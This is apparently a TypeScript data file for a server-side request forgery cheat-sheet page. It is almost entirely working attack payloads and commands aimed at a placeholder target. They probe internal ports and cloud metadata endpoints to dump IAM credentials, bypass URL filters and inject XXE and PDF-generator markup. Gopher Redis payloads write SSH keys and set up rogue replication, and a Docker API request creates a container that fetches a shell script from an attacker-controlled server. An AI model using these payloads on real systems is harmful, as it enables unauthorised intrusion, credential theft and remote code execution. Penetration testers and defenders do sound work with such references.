export interface SSRFCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const lastUpdated = "2026-05-15"
export const pageDescription = "Server-Side Request Forgery testing with cloud metadata endpoints, URL schemes, and exploitation techniques."

export const ssrfCategories: SSRFCategory[] = [
  {
    category: "What is SSRF?",
    commands: [
      { command: "Server-Side Request Forgery (SSRF) occurs when an app fetches remote resources based on user input without validation", description: "SSRF may lead to: Internal network access, Cloud metadata exposure, Blind SSRF interactions, Internal port scanning, Credential theft, Redis/Docker exploitation, SSRF to RCE chains" },
    ],
  },
  {
    category: "Common SSRF Parameters",
    commands: [
      { command: "cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u", description: "#1 Find URLs with common SSRF-prone parameters" },
      { command: "cat urls.txt | grep -i 'webhook|callback|upload|fetch|import|api' | sort -u", description: "#2 Find API/webhook integrations or cloud metadata patterns" },
      { command: "echo 'url= uri= path= dest= redirect= redirect_uri= next= return= continue= domain= feed= host= port= callback= webhook= api= fetch= file= img= src= load= proxy='", description: "Full list: url, uri, path, dest, redirect, redirect_uri, next, return, continue, domain, feed, host, port, callback, webhook, api, fetch, file, img, src, load, proxy" },
    ],
  },
  {
    category: "Basic SSRF Detection",
    commands: [
      { command: "curl \"https://target.com/page?url=http://127.0.0.1:80/\"", description: "#1 Basic SSRF to loopback interface" },
      { command: "curl \"https://target.com/page?url=http://localhost:8080\"", description: "#2 Test localhost on alternate port" },
      { command: "curl \"https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/\"", description: "#3 Target internal AWS cloud metadata endpoint" },
      { command: "curl \"https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"", description: "#4 Extract IAM security credentials from AWS metadata" },
    ],
  },
  {
    category: "Blind SSRF Detection",
    commands: [
      { command: "Burp Collaborator — https://target.com/?url=https://YOUR-ID.oastify.com", description: "#1 Use Burp Collaborator for blind SSRF detection" },
      { command: "interactsh-client", description: "#2 Start Interactsh client to receive callbacks" },
      { command: "cat urls.txt | gf ssrf | qsreplace \"https://xyz.oast.pro\" | httpx -silent", description: "#3 Replace all params with Interactsh URL via gf + qsreplace + httpx" },
      { command: "cat urls.txt | gf ssrf | qsreplace \"https://YOURBURP.oastify.com\" | httpx-toolkit -silent", description: "#4 SSRF pipeline with Burp Collaborator — replace params, send requests" },
    ],
  },
  {
    category: "SSRF Automation — GF & Nuclei",
    commands: [
      { command: "cat urls.txt | gf ssrf > ssrf_urls.txt", description: "#1 Use gf to filter URLs matching SSRF patterns" },
      { command: "nuclei -t http/vulnerabilities/ssrf/ -l urls.txt", description: "#2 Run Nuclei SSRF templates against URL list" },
      { command: "cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/", description: "#3 Pipe URLs directly into Nuclei SSRF scanning" },
      { command: "nuclei -t http/vulnerabilities/ssrf/ -l urls.txt -o ssrf_results.txt", description: "#4 Save Nuclei SSRF scan results to file" },
    ],
  },
  {
    category: "SSRF Automation — SSRFmap",
    commands: [
      { command: "git clone https://github.com/swisskyrepo/SSRFmap.git && cd SSRFmap && pip install -r requirements.txt", description: "#1 Install SSRFmap tool" },
      { command: "python3 ssrfmap.py -r request.txt -p url -m readfiles", description: "#2 Use SSRFmap with request file, param, and readfiles module" },
      { command: "python3 ssrfmap.py -r request.txt -p url -m portscan", description: "#3 Use SSRFmap to scan internal ports" },
      { command: "python3 ssrfmap.py -r request.txt -p url -m redis", description: "#4 Exploit internal Redis via SSRF" },
    ],
  },
  {
    category: "Internal Network Scanning via SSRF",
    commands: [
      { command: "https://target.com/?url=http://127.0.0.1:22", description: "#1 Test SSH port on loopback" },
      { command: "https://target.com/?url=http://10.0.0.5:8080", description: "#2 Test internal service on private IP" },
      { command: "ffuf -u \"https://target.com/?url=http://127.0.0.1:FUZZ\" -w ports.txt", description: "#3 Fuzz internal ports with ffuf" },
      { command: "ffuf -u \"https://target.com/?url=http://10.0.0.FUZZ:80\" -w ips.txt", description: "#4 Scan internal subnet IPs with ffuf" },
    ],
  },
  {
    category: "Cloud Metadata Exploitation",
    commands: [
      { command: "http://169.254.169.254/latest/meta-data/", description: "#1 AWS — List all metadata categories" },
      { command: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", description: "#2 AWS — Dump IAM role credentials" },
      { command: "http://metadata.google.internal/", description: "#3 GCP — Access Google Cloud metadata" },
      { command: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", description: "#4 Azure — Access instance metadata" },
    ],
  },
  {
    category: "SSRF Filter Bypass — IP Formats",
    commands: [
      { command: "http://127.1", description: "#1 Shortened IPv4 loopback" },
      { command: "http://2130706433", description: "#2 Decimal representation of 127.0.0.1" },
      { command: "http://0x7f000001", description: "#3 Hex representation of 127.0.0.1" },
      { command: "http://017700000001", description: "#4 Octal representation of 127.0.0.1" },
      { command: "http://[::1]", description: "#5 IPv6 loopback address" },
      { command: "http://127.0.0.1%23.google.com", description: "#6 Fragment bypass (URL-encoded #)" },
    ],
  },
  {
    category: "SSRF Filter Bypass — URL Confusion",
    commands: [
      { command: "http://127.0.0.1@google.com", description: "#1 Credential confusion — treated as user:pass@host" },
      { command: "http://google.com@127.0.0.1", description: "#2 Reverse credential confusion" },
      { command: "http://127.0.0.1#google.com", description: "#3 Fragment bypass — google.com is just a fragment" },
      { command: "http://google.com#127.0.0.1", description: "#4 Fragment hiding internal IP" },
    ],
  },
  {
    category: "SSRF Filter Bypass — Encoding",
    commands: [
      { command: "http://%31%32%37.0.0.1", description: "#1 URL-encoded decimal octets" },
      { command: "http://127%2e0%2e0%2e1", description: "#2 URL-encoded dots" },
      { command: "http://127。0。0。1", description: "#3 Unicode dots (wide characters)" },
    ],
  },
  {
    category: "Open Redirect → SSRF Chain",
    commands: [
      { command: "https://trusted.com/redirect?url=http://127.0.0.1", description: "#1 Step 1 — Find open redirect on trusted domain" },
      { command: "https://target.com/?url=https://trusted.com/redirect?url=http://127.0.0.1", description: "#2 Step 2 — Use open redirect to bypass allowlist SSRF" },
    ],
  },
  {
    category: "SSRF via PDF Generators",
    commands: [
      { command: "<img src=\"http://YOUR-SERVER/x\">", description: "#1 HTML img tag to exfiltrate via PDF generator" },
      { command: "<iframe src=\"http://169.254.169.254/latest/meta-data/\"></iframe>", description: "#2 Iframe to include cloud metadata in PDF output" },
      { command: "<link rel=\"stylesheet\" href=\"http://YOUR-SERVER/style.css\">", description: "#3 CSS link tag for blind SSRF callback" },
    ],
  },
  {
    category: "SSRF via XXE",
    commands: [
      { command: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]>", description: "#1 XXE + SSRF — access cloud metadata via external entity" },
      { command: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://YOUR-SERVER/data\">]>", description: "#2 Blind SSRF exfiltration via XXE" },
    ],
  },
  {
    category: "Dangerous Internal Targets",
    commands: [
      { command: "gopher://127.0.0.1:6379/", description: "#1 Redis — gopher protocol for Redis command injection" },
      { command: "gopher://127.0.0.1:9000/", description: "#2 FastCGI — PHP-FPM via gopher" },
      { command: "http://127.0.0.1:2375/version", description: "#3 Docker API — check Docker daemon version" },
      { command: "https://kubernetes.default.svc", description: "#4 Kubernetes API — internal cluster access" },
    ],
  },
  {
    category: "SSRF to RCE Chains",
    commands: [
      { command: "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh", description: "#1 Redis — write SSH key via config dir" },
      { command: "POST /containers/create — {\"Image\":\"alpine\",\"Cmd\":[\"curl\",\"http://YOUR-SERVER/shell.sh\"]}", description: "#2 Docker API — create malicious container" },
      { command: "gopher://127.0.0.1:6379/_SLAVEOF%20YOUR-SERVER%206379", description: "#3 Redis — rogue server replication for RCE" },
    ],
  },
  {
    category: "Pro Tips",
    commands: [
      { command: "Use — http:// https:// file:// gopher:// dict://", description: "Try different protocols — don't stick to HTTP only" },
      { command: "Blind SSRF may return no output — use out-of-band detection", description: "Don't rely only on HTTP response — check DNS/callbacks" },
      { command: "Some apps block localhost but allow IPv6, decimal IP, DNS rebinding, redirect chains", description: "Bypass techniques: IPv6 [::1], Decimal 2130706433, DNS rebinding, Redirect chains" },
      { command: "Monitor: Time delays, Different status codes, Response length, DNS interactions", description: "Detection signals: Response time differences, Unique status codes, Response size changes, DNS logs" },
    ],
  },
]

export const ssrfTools = [
  { name: "SSRFmap", url: "https://github.com/swisskyrepo/SSRFmap", description: "Automatic SSRF exploitation tool with modules for file read, portscan, Redis, etc." },
  { name: "Gopherus", url: "https://github.com/tarunkant/Gopherus", description: "Generate gopher:// payloads for SSRF exploitation (Redis, MySQL, FastCGI)" },
  { name: "Interactsh", url: "https://github.com/projectdiscovery/interactsh", description: "Out-of-band interaction tool for blind SSRF detection" },
  { name: "PayloadsAllTheThings — SSRF", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery", description: "Comprehensive SSRF payload and technique reference" },
  { name: "qsreplace", url: "https://github.com/tomnomnom/qsreplace", description: "Replace query string parameter values — useful with gf for SSRF fuzzing" },
]
